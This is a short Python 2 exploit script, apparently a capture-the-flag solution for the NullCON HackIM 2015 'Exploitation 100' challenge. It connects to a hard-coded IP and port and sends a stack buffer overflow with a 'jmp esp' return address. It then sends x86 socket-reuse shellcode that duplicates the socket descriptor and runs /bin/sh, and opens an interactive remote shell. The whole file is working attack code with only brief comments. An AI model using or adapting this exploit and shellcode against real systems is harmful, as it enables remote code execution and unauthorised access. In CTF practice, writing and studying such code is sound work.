#!/usr/bin/python
#
# NullCON HackIM 2015
# Exploitation 100
# @danigargu
#

import os
import sys
import time
from socket import *
from struct import pack

HOST = '54.163.248.69'
PORT = 9000

p = lambda x : pack("<L" , x)

def get_connection(host, port):
	s = socket(AF_INET, SOCK_STREAM)
	s.connect((HOST, PORT))
	return s

def interact(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(0.5)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break

def main():
 
	junk = "echo " + "A"*118
	jmp_esp = p(0x080488b0)  # jmp esp
	fd = 4                   # socket client fd

	payload = jmp_esp

	# shellcode - socket reuse
	# dup2(4,0) & dup2(4,1) & dup2(4,2) & execve("/bin/sh", 0, 0)
	payload += ("\x31\xc9\x31\xdb\xb3" + chr(fd) + "\x6a\x3f\x58\xcd\x80"
	            "\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x68\x2f\x2f"
	            "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80")

	s = get_connection(HOST, PORT)
	s.recv(255)
	s.send(junk + payload)
	time.sleep(0.5)
	interact(s)

if __name__ == '__main__':
	main()

